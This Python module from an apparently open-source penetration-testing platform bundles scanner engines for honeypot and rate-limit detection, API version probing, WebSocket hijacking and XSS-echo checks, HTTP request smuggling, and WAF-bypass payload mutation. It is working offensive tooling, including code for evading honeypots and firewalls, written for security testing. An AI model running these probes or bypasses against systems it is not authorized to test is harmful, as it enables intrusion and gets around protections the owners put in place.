# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

# engines/auxiliary_engines.py
"""
合并辅助引擎模块（原 anti_scan / api_version_diff / http2_websocket / request_smuggling / waf_bypass）
功能：反制检测、API版本差异、HTTP2/WS、请求走私、WAF绕过工具集
修复：AntiScanDetector.is_honeypot 使用页面相似度检测替代关键词匹配
"""

import re
import asyncio
import base64
import hashlib
import random
import urllib.parse
import uuid
from urllib.parse import urlparse

from vulnclaw.core.logger import logger
from vulnclaw.core.settings import settings
from vulnclaw.core.utils import async_get, async_post
from vulnclaw.engines.base import BaseEngine
from typing import Dict, List, Tuple


# ============================================================
# 1. AntiScanDetector（修复版 - 页面相似度检测蜜罐）
# ============================================================

def _afn(name, default):
    """读 anti_scan 配置项，失败/缺失回退默认值（保持向后兼容）。"""
    try:
        from vulnclaw.config.settings import settings
        return getattr(settings, name, default)
    except Exception:  # noqa: BLE001
        return default

def _resolve_anti(name, default, bidx):
    """反制判定阈值解析：用户显式配置 > 目标基线 > 出厂默认。

    用户显式修改过全局配置（现值 != 出厂默认）→ 用户优先；
    否则若存在目标反检测基线 → 用基线推导阈值（量体定制，SPA 大站免误判）；
    都不满足 → 出厂默认。
    """
    cur = _afn(name, default)
    if cur != default:
        return cur
    try:
        from vulnclaw.core.target_anti_scan_baseline import get_anti_scan_baseline
        bl = get_anti_scan_baseline()
        if bl is not None and getattr(bl, "probed", False):
            v = getattr(bl, bidx, 0) or 0
            if v > 0:
                return v
    except Exception:  # noqa: BLE001
        pass
    return default


class AntiScanDetector:
    """反制扫描检测器 - 修复版"""

    _page_cache = {}
    _cache_ttl = 60  # 缓存60秒

    @staticmethod
    def is_honeypot(text: str, headers: Dict) -> Tuple[bool, str]:
        """
        检测是否为蜜罐 - 修复版
        使用页面相似度检测：多次请求返回几乎相同的随机占位符 => 疑似蜜罐
        """
        import re
        # 2026-09-08: 超大响应（>= 大页门槛）视为完整 SPA 外壳：登录页/首页
        # 1.6MB 含 35+ UUID 是真实页面而非蜜罐。蜜罐通常是小体量动态页。
        # 大响应跳过所有正文类判定（UUID/占位符/关键词），仅保留响应头强信号。
        if len(text) >= _afn("anti_scan_honeypot_big_page", 512000):
            for h in (["X-Honeypot", "Honeypot", "X-Decoy", "X-Canary"]):
                if h in headers:
                    return True, f"响应头包含蜜罐标识: {h}"
            return False, ""

        # 方法1：检测大量动态UUID（蜜罐常见特征）
        uuid_pattern = r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
        uuid_count = len(re.findall(uuid_pattern, text, re.I))

        _uuid_th = _resolve_anti("anti_scan_uuid_threshold", 15, "uuid_threshold")
        _min_len = _resolve_anti("anti_scan_honeypot_min_text", 8000, "min_text")
        if uuid_count > _uuid_th and len(text) > _min_len:
            return True, f"检测到大量动态UUID ({uuid_count}个)，疑似蜜罐动态生成页面"

        # 方法2：检测随机数占位符（如 {{random}} 或 {{uuid}} 残留）
        random_patterns = [
            r'\{\{[a-zA-Z_][a-zA-Z0-9_]*\}\}',  # {{placeholder}}
            r'__[a-zA-Z0-9]{16,}__',  # __random_id__
            r'data-[a-z]+-id="[a-zA-Z0-9]{16,}"',  # data-xxx-id="random"
            r'id="[a-zA-Z0-9]{20,}"',  # 超长ID
        ]
        for pattern in random_patterns:
            matches = re.findall(pattern, text)
            if len(matches) > _resolve_anti("anti_scan_placeholder_threshold", 10, "placeholder_threshold"):
                return True, f"检测到大量随机占位符 ({len(matches)}个)，疑似蜜罐"

        # 方法3：检测是否有明显的蜜罐指纹
        honeypot_headers = ["X-Honeypot", "Honeypot", "X-Decoy", "X-Canary"]
        for h in honeypot_headers:
            if h in headers:
                return True, f"响应头包含蜜罐标识: {h}"

        # 方法4：检测过时的关键词（低优先级，仅作辅助）
        legacy_keywords = ["honeypot", "honeyd", "cowrie", "kippo", "dionaea", "glastopf"]
        text_lower = text.lower()
        for kw in legacy_keywords:
            if kw in text_lower:
                # 只有同时满足其他条件才判定为蜜罐
                if len(text) > 5000 or uuid_count > 5:
                    return True, f"蜜罐关键词 + 异常特征: {kw}"

        return False, ""

    @staticmethod
    def is_fake_404(text: str, status: int) -> Tuple[bool, str]:
        """检测是否为假 404

        2026-09-08 修复（SPA 大站免误判）：
        - 若目标基线已学：响应与正常页同量级（>= 基线 min_text x 0.7）视为
          SPA 软404 外壳（正常现象），不再判假404。此前 Audible 软404 外壳
          必含 login/home 词 → 全站误判"假404包含正常内容" → 消极区/退避。
        - content_indicators 收窄为强登录信号词，去掉 home/index/dashboard/admin
          这类任意 SPA 外壳都含的宽泛词。
        """
        if status != 404:
            return False, ""
        n = len(text)
        # 2026-09-08: 基线量级门限（与限流判定同口径：采样峰值 x 0.8）。
        # SPA 软404 外壳 = 完整 UI 外壳，与正常页同量级 => 视为正常现象，不判假404。
        # 此前 Audible 软404 外壳必含 home/login 词 -> 全站误判 -> 消极区/退避。
        try:
            from vulnclaw.core.target_anti_scan_baseline import get_anti_scan_baseline
            _bl = get_anti_scan_baseline()
            if _bl is not None and getattr(_bl, "probed", False):
                _peak = int(getattr(_bl, "sample_max_len", 0) or 0)
                if _peak > 0 and n >= int(_peak * 0.8):
                    return False, ""
        except Exception:  # noqa: BLE001
            pass
        # 2026-09-08: 无基线时超大体量 404 同样视为 SPA 软404 外壳（真 404 站点页面小），
        # 不再按体量判假404。基线存在时上方量级门限已覆盖。
        if n >= _resolve_anti("anti_scan_honeypot_big_page", 512000, "min_text"):
            return False, ""
        if n > _resolve_anti("anti_scan_fake404_min_text", 5000, "min_text"):
            return True, f"响应体过大 ({n} 字节)，可能为假404"
        content_indicators = ["login", "home", "index", "dashboard", "admin"]
        if any(ind in text.lower() for ind in content_indicators):
            return True, "假404包含正常内容"
        return False, ""

    @staticmethod
    def is_rate_limited(text: str, headers: Dict) -> Tuple[bool, str]:
        """检测是否被限流"""
        rate_limit_headers = [
            "X-RateLimit-Limit", "X-RateLimit-Remaining", "X-RateLimit-Reset",
            "Retry-After", "RateLimit-Limit"
        ]
        for h in rate_limit_headers:
            if h in headers:
                return True, f"限流响应头: {h}"

        rate_limit_text = _afn("anti_scan_rate_limit_keywords", ["rate limit", "too many requests", "429", "slow down", "try again later"])

        # 2026-09-08: 基线量级门限。响应与正常页同量级（>= 采样峰值 x 0.8）
        # => 完整页面（SPA 外壳/JS 里的裸 "429"、错误文案），正文关键词一律不判
        # 限流。此前 Audible 全站误判限流 -> 每请求退避 3s/6s/12s -> 任务 240s 超时。
        full_page = False
        try:
            from vulnclaw.core.target_anti_scan_baseline import get_anti_scan_baseline
            _bl = get_anti_scan_baseline()
            if _bl is not None and getattr(_bl, "probed", False):
                _peak = int(getattr(_bl, "sample_max_len", 0) or 0)
                if _peak > 0 and len(text or "") >= int(_peak * 0.8):
                    full_page = True
        except Exception:  # noqa: BLE001
            pass
        if full_page:
            return False, ""
        # 2026-09-08: 基线未建时兜底——超大响应视为完整页面（SPA 外壳含有
        # 限流关键词是 JS 文案，非真限流）。与蜜罐 big_page 同口径。
        if len(text or "") >= _resolve_anti("anti_scan_honeypot_big_page", 512000, "min_text"):
            return False, ""

        text_lower = text.lower()
        for ind in rate_limit_text:
            if ind == "429":
                # 裸状态码降级为辅助信号：仅由限流响应头/真实 429 响应兜底，
                # 正文里的 "429" 大概率是 JS 常量，不再单独判定。
                continue
            if ind in text_lower:
                return True, "限流提示"

        return False, ""

    @staticmethod
    def is_ip_blocked(text: str, status: int) -> Tuple[bool, str]:
        """检测 IP 是否被封禁"""
        if status in [403, 401]:
            block_indicators = _afn("anti_scan_blocked_keywords", ["blocked", "banned", "blacklisted", "denied", "forbidden", "unauthorized"])
            if any(ind in text.lower() for ind in block_indicators):
                return True, f"IP被封禁: {text[:100]}"
        return False, ""

    @staticmethod
    def analyze_response(text: str, status: int, headers: Dict) -> Dict:
        """综合分析响应"""
        results = {
            "is_honeypot": False,
            "is_fake_404": False,
            "is_rate_limited": False,
            "is_ip_blocked": False,
            "issues": []
        }

        is_hp, hp_msg = AntiScanDetector.is_honeypot(text, headers)
        if is_hp:
            results["is_honeypot"] = True
            results["issues"].append(hp_msg)

        is_fake, fake_msg = AntiScanDetector.is_fake_404(text, status)
        if is_fake:
            results["is_fake_404"] = True
            results["issues"].append(fake_msg)

        is_rl, rl_msg = AntiScanDetector.is_rate_limited(text, headers)
        if is_rl:
            results["is_rate_limited"] = True
            results["issues"].append(rl_msg)

        is_ipb, ipb_msg = AntiScanDetector.is_ip_blocked(text, status)
        if is_ipb:
            results["is_ip_blocked"] = True
            results["issues"].append(ipb_msg)

        return results


# ============================================================
# 2. APIVersionDiffEngine
# ============================================================

class APIVersionDiffEngine(BaseEngine):
    """API 版本差异检测引擎"""

    name = "api_version_diff"
    description = "API 版本差异检测"

    VERSION_PATTERNS = [
        r'/v(\d+)/',
        r'/api/v(\d+)/',
        r'/version/v(\d+)/',
        r'version=(\d+)',
        r'api-version=(\d+)',
    ]

    async def check(self, url, param, normal_resp, parsed_query, session, **kwargs):
        return None

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        findings = []
        urlparse(target)
        timeout = getattr(settings, 'timeout', 30)

        logger.info(f"📌 [APIVersion] 检测 API 版本差异: {target}")

        current_version = None
        for pattern in self.VERSION_PATTERNS:
            match = re.search(pattern, target)
            if match:
                current_version = match.group(1)
                break

        if not current_version:
            try:
                resp = await async_get(target, session=session, timeout=timeout)
                text = resp[1] if isinstance(resp, tuple) else await resp.text()
                version_matches = re.findall(r'"version"\s*[:=]\s*"v?(\d+)"', text)
                if version_matches:
                    current_version = version_matches[0]
            except BaseException:
                logger.debug("suppressed exception (engine audit)")

        if current_version:
            versions_to_test = ["1", "2", "3", "4", "5"] if current_version == "1" else ["1"]
            versions_to_test = [v for v in versions_to_test if v != current_version]

            for v in versions_to_test:
                test_url = target.replace(f"v{current_version}", f"v{v}")
                if test_url == target:
                    test_url = target.replace("/api/", f"/api/v{v}/")
                try:
                    resp = await async_get(test_url, session=session, timeout=5)
                    status, text = self._parse_response(resp)
                    if status == 200 and len(text) > 50:
                        findings.append({
                            'url': test_url,
                            'type': f'API版本差异-v{v}可访问',
                            'severity': 'High',
                            'ai_verdict': '高',
                            'evidence': f'API v{v} 可访问，可能包含未修复漏洞',
                            'method': 'api_version_diff'
                        })
                except BaseException:
                    logger.debug("suppressed exception (engine audit)")

        logger.info(f"   ✅ APIVersion 完成，发现 {len(findings)} 个问题")
        return findings

    def _parse_response(self, resp):
        if isinstance(resp, tuple):
            return resp[0], resp[1] if resp[1] else ""
        from vulnclaw.core.utils import sync_resp_text
        return resp.status, sync_resp_text(resp)


# ============================================================
# 3. HTTP2WebSocketEngine
# ============================================================

class HTTP2WebSocketEngine(BaseEngine):
    """HTTP/2 与 WebSocket 检测引擎"""

    name = "http2_ws"
    description = "HTTP/2 与 WebSocket 漏洞检测"

    async def check(self, url, param, normal_resp, parsed_query, session, **kwargs):
        return None

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        findings = []
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        timeout = getattr(settings, 'timeout', 30)

        logger.info(f"🔌 [HTTP2/WS] 检测 HTTP/2 与 WebSocket: {target}")

        # 1. 检测 HTTP/2 支持
        try:
            import aiohttp
            conn = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=conn) as sess:
                async with sess.get(target, timeout=timeout) as resp:
                    if resp.version == (2, 0):
                        findings.append({
                            'url': target,
                            'type': 'HTTP/2 支持',
                            'severity': 'Info',
                            'ai_verdict': '信息',
                            'evidence': '服务器支持 HTTP/2，可能存在 HTTP/2 请求走私风险',
                            'method': 'http2_support'
                        })
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        # 2. WebSocket 端点发现与安全检测（CSWSH / Accept 校验 / 消息注入）
        ws_paths = ["/ws", "/websocket", "/socket", "/ws/", "/live", "/stream", "/events", "/push", "/realtime"]
        try:
            import aiohttp
            async with aiohttp.ClientSession() as sess:
                for path in ws_paths:
                    ws_url = base + path
                    try:
                        findings.extend(
                            await self._analyze_ws_endpoint(ws_url, sess, timeout=5)
                        )
                    except BaseException:
                        continue
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        logger.info(f"   ✅ HTTP2/WS 完成，发现 {len(findings)} 个问题")
        return findings

    async def _analyze_ws_endpoint(self, ws_url: str, sess, timeout: int = 5) -> List[Dict]:
        """WebSocket 端点安全检测：发现、Sec-WebSocket-Accept 校验、CSWSH、消息注入。"""
        import aiohttp
        findings = []
        ws_key = base64.b64encode(b"vulnclaw-ws-probe-key").decode()
        expected_accept = base64.b64encode(
            hashlib.sha1((ws_key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()
        ).decode()

        # 1) 握手层：端点发现 + Accept 校验 + 未授权访问
        try:
            headers = {
                "Connection": "Upgrade",
                "Upgrade": "websocket",
                "Sec-WebSocket-Key": ws_key,
                "Sec-WebSocket-Version": "13",
            }
            async with sess.get(ws_url, headers=headers, timeout=timeout) as resp:
                upgrade = resp.headers.get("Upgrade", "").lower()
                accept = resp.headers.get("Sec-WebSocket-Accept", "")

                if resp.status == 101 or "websocket" in upgrade:
                    findings.append({
                        'url': ws_url,
                        'type': 'WebSocket 端点发现',
                        'severity': 'Medium',
                        'ai_verdict': '中',
                        'evidence': f'WebSocket 端点可访问: {ws_url}',
                        'method': 'websocket_discovery',
                    })

                if accept and accept != expected_accept:
                    findings.append({
                        'url': ws_url,
                        'type': 'WebSocket 握手校验缺陷',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'evidence': (f'Sec-WebSocket-Accept 与 RFC6455 计算结果不一致: '
                                     f'期望 {expected_accept[:16]}…，实际 {accept[:16]}…'),
                        'method': 'websocket_accept_mismatch',
                    })

                if resp.status == 200:
                    body = await resp.text()
                    if len(body) > 50:
                        findings.append({
                            'url': ws_url,
                            'type': 'WebSocket 未授权访问',
                            'severity': 'High',
                            'ai_verdict': '高',
                            'evidence': 'WebSocket 端点无需认证即可访问',
                            'method': 'websocket_unauth',
                        })
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        # 2) CSWSH：使用恶意 Origin 发起真实 WebSocket 连接
        try:
            async with sess.ws_connect(
                ws_url,
                headers={"Origin": "https://evil.example"},
                receive_timeout=timeout,
                max_msg_size=0,
            ) as ws:
                findings.append({
                    'url': ws_url,
                    'type': 'CSWSH 跨站 WebSocket 劫持',
                    'severity': 'High',
                    'ai_verdict': '高',
                    'evidence': '恶意 Origin 成功建立 WebSocket 连接，若端点依赖 Cookie 认证则存在跨站劫持风险',
                    'method': 'websocket_cswsh',
                })
                # 3) 消息注入：发送 XSS 帧并检测回显
                payload = "<script>alert(document.domain)</script>"
                await ws.send_str(payload)
                try:
                    msg = await ws.receive(timeout=timeout)
                    if msg.type == aiohttp.WSMsgType.TEXT and payload in str(msg.data or ""):
                        findings.append({
                            'url': ws_url,
                            'type': 'WebSocket 消息回显注入',
                            'severity': 'High',
                            'ai_verdict': '高',
                            'evidence': '发送的 XSS 帧被原样回显，客户端渲染时可能造成持久 XSS',
                            'payload': payload,
                            'method': 'websocket_message_injection',
                        })
                except BaseException:
                    logger.debug("suppressed exception (engine audit)")
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        return findings


# ============================================================
# 4. RequestSmugglingEngine
# ============================================================

class RequestSmugglingEngine(BaseEngine):
    """HTTP 请求走私检测引擎"""

    name = "request_smuggling"
    description = "HTTP 请求走私检测"

    async def check(self, url, param, normal_resp, parsed_query, session, **kwargs):
        return None

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        findings = []
        timeout = getattr(settings, 'timeout', 30)

        logger.info(f"📦 [Smuggling] 检测 HTTP 请求走私: {target}")

        # CL.TE 走私检测（差分确认版）
        # 准确率修复：旧版仅凭"服务器对 CL+TE 双头返回 200/403"即报 Critical，
        # 几乎所有服务器都会误报（含 httpbin.org）。真实走私需要差分信号：
        # 在 body 中夹带走私前缀（GET /marker），若后端处理了该前缀，
        # 紧随其后的正常请求会收到针对 /marker 的响应（marker 出现）或连接被污染（超时）。
        marker = f"smuggled-{uuid.uuid4().hex[:10]}"
        host = urlparse(target).netloc
        smuggled_prefix = f"0\r\n\r\nGET /{marker} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        try:
            headers = {
                "Content-Length": str(len(smuggled_prefix)),
                "Transfer-Encoding": "chunked",
            }
            resp = await async_post(
                target, data=smuggled_prefix, headers=headers,
                session=session, timeout=timeout, no_retry=True,
            )
            status, text = self._parse_response(resp)

            if marker in text:
                findings.append({
                    'url': target,
                    'type': 'HTTP请求走私-CL.TE确认',
                    'severity': 'Critical',
                    'ai_verdict': '高',
                    'confidence': 'high',
                    'evidence': f'走私前缀 GET /{marker} 被后端直接处理并回显',
                    'method': 'request_smuggling_confirmed'
                })
            else:
                # 差分确认：立即发送一条普通请求，观察连接是否被走私前缀污染
                # （async_get 超时不抛异常，返回 (0, "Timeout after Ns")）
                try:
                    follow = await async_get(target, session=session, timeout=10, no_retry=True)
                    f_status, f_text = self._parse_response(follow)
                    if marker in f_text:
                        findings.append({
                            'url': target,
                            'type': 'HTTP请求走私-CL.TE确认',
                            'severity': 'Critical',
                            'ai_verdict': '高',
                            'confidence': 'high',
                            'evidence': f'后续请求收到了走私前缀 GET /{marker} 的响应（连接被污染）',
                            'method': 'request_smuggling_confirmed'
                        })
                    elif f_status == 0 and 'timeout' in f_text.lower():
                        findings.append({
                            'url': target,
                            'type': 'HTTP请求走私-疑似',
                            'severity': 'Medium',
                            'ai_verdict': '中',
                            'confidence': 'medium',
                            'evidence': '走私探测后后续请求超时，连接疑似被污染（需手工复核）',
                            'method': 'request_smuggling_suspected'
                        })
                except BaseException:
                    logger.debug("suppressed exception (engine audit)")
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        logger.info(f"   ✅ Smuggling 完成，发现 {len(findings)} 个问题")
        return findings

    def _parse_response(self, resp):
        if isinstance(resp, tuple):
            return resp[0], resp[1] if resp[1] else ""
        from vulnclaw.core.utils import sync_resp_text
        return resp.status, sync_resp_text(resp)


# ============================================================
# 5. WAFBypass
# ============================================================

class WAFBypass:
    """WAF 绕过工具集"""

    @staticmethod
    def cloudflare_bypass(payload: str) -> List[str]:
        """Cloudflare 绕过"""
        variants = []
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace(" ", "/*!*/"))
        variants.append(''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload))
        variants.append(urllib.parse.quote(payload))
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
        variants.append(payload.replace(" ", "%0a"))
        variants.append(payload.replace(" ", "%0d"))
        variants.append(payload.replace(" ", "%09"))
        variants.append(payload.replace("OR", "||"))
        variants.append(payload.replace("AND", "&&"))
        variants.append(payload.replace("SELECT", "/*!50000SELECT*/"))
        return list(set(variants))

    @staticmethod
    def aws_waf_bypass(payload: str) -> List[str]:
        """AWS WAF 绕过"""
        variants = []
        variants.append(payload.replace("'", "´"))
        variants.append(payload.replace("'", "`"))
        variants.append(payload.replace(" ", "%20%20"))
        variants.append(payload.replace("=", " LIKE "))
        variants.append(payload + "-- -")
        variants.append(payload + "/*")
        variants.append(payload.replace("(", "(").replace(")", ") /*"))
        return list(set(variants))

    @staticmethod
    def f5_bigip_bypass(payload: str) -> List[str]:
        """F5 BigIP 绕过"""
        variants = []
        variants.append(payload.replace("'", "%27"))
        variants.append(payload.replace(" ", "%20"))
        variants.append(payload.replace("OR", "%4f%52"))
        variants.append(payload.replace("AND", "%41%4e%44"))
        variants.append(payload + "%00")
        variants.append(payload.replace("'", "’"))
        return list(set(variants))

    @staticmethod
    def modsecurity_bypass(payload: str) -> List[str]:
        """ModSecurity 绕过"""
        variants = []
        variants.append(payload.replace(" ", "\t"))
        variants.append(payload.replace(" ", "\n"))
        variants.append(payload.replace("=", "!="))
        variants.append(payload + "%00")
        variants.append(payload.replace("'", "\\'"))
        variants.append(payload.replace('"', '\\"'))
        return list(set(variants))

    @staticmethod
    def get_all_bypasses(payload: str, waf_type: str = None) -> List[str]:
        """获取所有绕过变体"""
        all_variants = [payload]
        if waf_type == "cloudflare" or not waf_type:
            all_variants.extend(WAFBypass.cloudflare_bypass(payload))
        if waf_type == "aws_waf" or not waf_type:
            all_variants.extend(WAFBypass.aws_waf_bypass(payload))
        if waf_type == "f5_bigip" or not waf_type:
            all_variants.extend(WAFBypass.f5_bigip_bypass(payload))
        if waf_type == "modsecurity" or not waf_type:
            all_variants.extend(WAFBypass.modsecurity_bypass(payload))
        return list(set(all_variants))


# ============================================================
# 导出
# ============================================================

__all__ = [
    'AntiScanDetector',
    'APIVersionDiffEngine',
    'HTTP2WebSocketEngine',
    'RequestSmugglingEngine',
    'WAFBypass'
]
